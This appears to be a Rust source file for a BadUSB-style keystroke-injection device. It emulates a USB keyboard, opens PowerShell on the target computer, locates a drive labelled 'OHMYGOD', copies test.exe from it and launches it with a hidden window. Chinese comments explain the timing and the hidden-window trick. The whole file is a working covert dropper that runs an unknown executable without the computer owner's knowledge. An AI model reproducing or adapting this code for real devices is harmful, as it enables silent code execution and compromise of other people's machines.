use std::{thread::sleep, time::Duration};

use hidg::{Class, Device, Keyboard};
use keyboard_helper::KeyboardHelper;
use simple_logger::SimpleLogger;
use simulator::KeySimulator;
use simulator::DRIVER_LETTER_VAR_NAME;

mod keyboard_helper;
mod simulator;

const DRIVER_NAME: &str = "OHMYGOD";

fn main() -> std::io::Result<()> {
    SimpleLogger::new().init().unwrap();

    let mut device = Device::<Keyboard>::open(0)?;
    let mut input = Keyboard.input();
    let mut key_helper = KeyboardHelper::new(&mut device, &mut input);
    let mut simulator = KeySimulator::new(&mut key_helper);

    simulator.open_powershell()?;
    sleep(Duration::from_millis(1000));  // 必须等待一段时间，当PowerShell完全弹出后，它才开始接收输入
    
    simulator.get_driver_letter(DRIVER_NAME)?;
    simulator.run_command_in_powershell(format!("copy ${{{DRIVER_LETTER_VAR_NAME}}}\\test.exe test.exe").as_str())?;

    // Start-Process：创建一个独立于当前控制台的程序，当前控制台退出不影响程序继续运行
    // -WindowStyle Hidden: 新程序的窗口被隐藏
    simulator.run_command_in_powershell("Start-Process -FilePath test -ArgumentList file -WindowStyle Hidden")?;
    simulator.run_command_in_powershell("exit")?;

    Ok(())
}